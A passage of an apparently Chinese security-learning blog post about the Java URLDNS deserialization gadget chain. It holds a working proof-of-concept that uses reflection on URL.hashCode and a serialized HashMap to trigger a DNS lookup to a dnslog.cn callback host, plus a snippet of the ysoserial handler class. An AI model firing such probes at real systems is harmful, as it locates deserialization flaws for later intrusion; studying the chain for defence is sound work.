<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">static class SilentURLStreamHandler extends URLStreamHandler &#123;</span><br><span class="line"></span><br><span class="line">        protected URLConnection openConnection(URL u) throws IOException &#123;</span><br><span class="line">                return null;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        protected synchronized InetAddress getHostAddress(URL u) &#123;</span><br><span class="line">                return null;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">贴一个大佬的pop</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.net.URL;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line"></span><br><span class="line">public class UrlDns &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        HashMap hashMap = new HashMap();</span><br><span class="line">        URL url = new URL(&quot;http://s0y1rl.dnslog.cn/&quot;);</span><br><span class="line">       Field hashCode = Class.forName(&quot;java.net.URL&quot;).getDeclaredField(&quot;hashCode&quot;);//通过反射获取到hashcode</span><br><span class="line">        hashCode.setAccessible(true);//绕过java语言权限控制检查权限</span><br><span class="line">        hashCode.set(url, 0);//设置hashcode的值为其他数字</span><br><span class="line">        hashMap.put(url, null);//调用hashmap对象中的put方法，此时hashcode不为-1不触发dns查询</span><br><span class="line">        hashCode.set(url, -1);//将hashcode重新赋值为-1</span><br><span class="line">        try &#123;</span><br><span class="line">            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">            outputStream.writeObject(hashMap);</span><br><span class="line">            outputStream.close();</span><br><span class="line">            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Reflections.setFieldValue(u, &quot;hashCode&quot;, -1); </span><br></pre></td></tr></table></figure>

<p><img src="/2024/11/21/URLDNS/3.png" alt="URLDNS"></p>
<p><img src="/2024/11/21/URLDNS/2.png" alt="URLDNS"></p>
<p><img src="/2024/11/21/URLDNS/4.png" alt="URLDNS"></p>
<p>dns解析了</p>
<p>参考</p>
<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1nz421Q76s/?spm_id_from=333.337.search-card.all.click&vd_source=e0e644e769a3b3b63136c758f2b61c25">https://www.bilibili.com/video/BV1nz421Q76s/?spm_id_from=333.337.search-card.all.click&amp;vd_source=e0e644e769a3b3b63136c758f2b61c25</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.nbcares.top/archives/1711543592348#heading-22">https://blog.nbcares.top/archives/1711543592348#heading-22</a></p>
<p><a target="_blank" rel="noopener" href="https://gtl-ju.github.io/2023/07/15/URLDNS/">https://gtl-ju.github.io/2023/07/15/URLDNS/</a></p>

                    </div>
</div>

    <div class="cube-article-nav">
        <ul>
            
                    
                        <li class="next">
                            <a href="/2024/09/19/hongri02/">
                                hongri02
                                    <i class="cube-icon cube-next" aria-hidden="true"></i>
                            </a>
                        </li>
                        
        </ul>
    </div>
    
        
            <!-- TODO 根据theme.comment的内容进行入口选择 -->

                
        </div>
        <div class="cube-right">
            

<div class="cube-search cube-sidebar" id="cube-search">
    <div class="search-container">
        <input type="text" placeholder="Search" class="cube-search-input" id="cube-search-input">
        <i class="cube-icon cube-icon-search cube-search-submit" aria-hidden="true"></i>
    </div>
    <!-- TODO 通过给window赋一个全局变量，通过脚本赋值 -->
</div>
<script>
    (function (window) {
        'use strict';
        window.searchModule = {}
        window.searchModule.JSONUrl = '/content.json'
        window.searchModule.rootUrl = '/'
    })(window)
</script>
<div class="cube-search-form">
    <div class="cube-search-control">
        <input type="text" placeholder="Search" class="search-input">
        <a class="close-button">
            <i class="cube-icon cube-close" aria-hidden="true"></i>
        </a>
    </div>
    <div class="cube-search-result"></div>
</div>


<div class="cube-author cube-sidebar" id="cube-author">
    
    
    <span>John Doe</span>
    
    
    <div class="count">
        <a class="count articles"><span>23</span>Article</a>
        <a class="count tags"><span>0</span>Tags</a>
        <a class="count categories"><span>0</span>Categories</a>
    </div>
</div>



<div class="cube-music cube-sidebar" id="cube-music">
    <div class="cube-player aplayer" id="cube-player"></div>
</div>
<script>
    (function (window) {
        window.musicModule = {}
        window.musicModule.musicConfig = '{"narrow":false,"autoplay":false,"showlrc":3,"theme":"#b7daff","mutex":true,"mode":"circulation","preload":"auto","listmaxheight":"513px","music":[{"title":"Dear friends","author":"TRIPLANE","url":"http://cube-1252774894.cosgz.myqcloud.com/music/source/TRIPLANE - Dear friends.mp3","lrc":"http://cube-1252774894.cosgz.myqcloud.com/music/lrc/Dear friends - TRIPLANE.lrc","pic":"http://cube-1252774894.cosgz.myqcloud.com/music/image/TRIPLANE - Dear friends.jpg"},{"title":"Butter-Fly","author":"和田光司","url":"http://cube-1252774894.cosgz.myqcloud.com/music/source/和田光司 - Butter-Fly (ピアノヴァージョン).mp3","lrc":"http://cube-1252774894.cosgz.myqcloud.com/music/lrc/Butter-Fly (ピアノヴァージョン) - 和田光司.lrc","pic":"http://cube-1252774894.cosgz.myqcloud.com/music/image/和田光司 - Butter-Fly (ピアノヴァージョン).jpg"},{"title":"宵闇花火","author":"葉月ゆら","url":"http://cube-1252774894.cosgz.myqcloud.com/music/source/葉月ゆら - 宵闇花火.mp3","lrc":"http://cube-1252774894.cosgz.myqcloud.com/music/lrc/宵闇花火 - 葉月ゆら.lrc","pic":"http://cube-1252774894.cosgz.myqcloud.com/music/image/葉月ゆら - 宵闇花火.jpg"}]}'
        window.musicModule.lrcConfig = {
            open: 'Open Lyrics',
            close: 'Close Lyrics'
        }
    })(window)
</script>



<div class="cube-recent-posts cube-sidebar" id="cube-recent-posts">
    <div class="title">
        <a>Recent Posts</a>
    </div>
    <ul class="list">
        
        
        <li>
            <!-- TODO 如果文章要显示图片，那么在front-matter上添加preview属性(url or path) -->
            
            <div class="normal">
                <p class="index first">
                    <span>1</span>
                </p>
                <p class="title">
                    <a href="/2024/11/21/URLDNS/" title=""></a>
                </p>
            </div>
            
        </li>
        
        
        
        <li>
            <div class="normal">
                <p class="index">
                    <span>2</span>
                </p>
                <p class="title">
                    <a href="/2024/09/19/hongri02/" title="hongri02">hongri02</a>
                </p>
            </div>
        </li>
        
        
        
        <li>
            <div class="normal">
                <p class="index">
                    <span>3</span>
                </p>
                <p class="title">
                    <a href="/2024/08/20/hongri01/" title="hongri01">hongri01</a>
                </p>
            </div>
        </li>
        
        
        
        <li>
            <div class="normal">
                <p class="index">
                    <span>4</span>
                </p>
                <p class="title">
                    <a href="/2024/08/03/cont/" title="cont">cont</a>
                </p>
            </div>
        </li>
        
        
        
        <li>
            <div class="normal">
                <p class="index">
                    <span>5</span>
                </p>
                <p class="title">
                    <a href="/2024/08/01/MyFileServer/" title="MyFileServer">MyFileServer</a>
                </p>
            </div>
        </li>
        
        
    </ul>
</div>







<div class="cube-links cube-sidebar" id="cube-links">
    <div class="title">
        <a>Links</a>
    </div>
    <ul class="list">
        
        <li>
            
            
            <img src="http://cube-1252774894.cosgz.myqcloud.com/links/GitHub.png">
            
            <a href="https://github.com/ZEROKISEKI" target="_blank">GitHub</a>
        </li>
        
        <li>
            
            
            <img src="http://cube-1252774894.cosgz.myqcloud.com/links/Coding.png">
            
            <a href="https://coding.net/u/SORA1" target="_blank">Coding</a>
        </li>
        
        <li>
            
            
            <img src="http://cube-1252774894.cosgz.myqcloud.com/links/SF.png">
            
            <a href="https://segmentfault.com/u/aonosora" target="_blank">SF社区</a>
        </li>
        
        <li>
            
            
            <img src="http://cube-1252774894.cosgz.myqcloud.com/links/开发者头条.png">
            
            <a href="https://toutiao.io/u/148070" target="_blank">开发者头条</a>
        </li>
        
    </ul>
</div>



<div class="cube-friend-links cube-sidebar" id="cube-friend-links">
    <div class="title">
        <a>Friend Links</a>
    </div>
    <ul class="list">
        
        <li>
            <!-- TODO change avatar.png to friend.png-->
            <img src="http://cube-1252774894.cosgz.myqcloud.com/friend_links/micblo.png">
            <a href="https://blog.micblo.com/" target="_blank">罗大佬</a>
        </li>
        
        <li>
            <!-- TODO change avatar.png to friend.png-->
            <img src="http://cube-1252774894.cosgz.myqcloud.com/friend_links/DIYgod.jpg">
            <a href="https://www.anotherhome.net/" target="_blank">DIYgod</a>
        </li>
        
        <li>
            <!-- TODO change avatar.png to friend.png-->
            <img src="/images/friend_links.jpg ">
            <a href="https://aonosora.com/" target="_blank">咪西西の部落格</a>
        </li>
        
    </ul>
</div>


        </div>
    </div>
</div>
<footer class="cube-footer">
    
© 2017 John Doe

<br>
Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>.&nbsp;Theme by <a href="https://github.com/ZEROKISEKI" target="_blank">AONOSORA</a>
</footer>
<!-- inject:script -->
<script src="/js/script.js"></script>
<!-- endinject -->
<div class="cube-loading out"></div>
</body>
</html>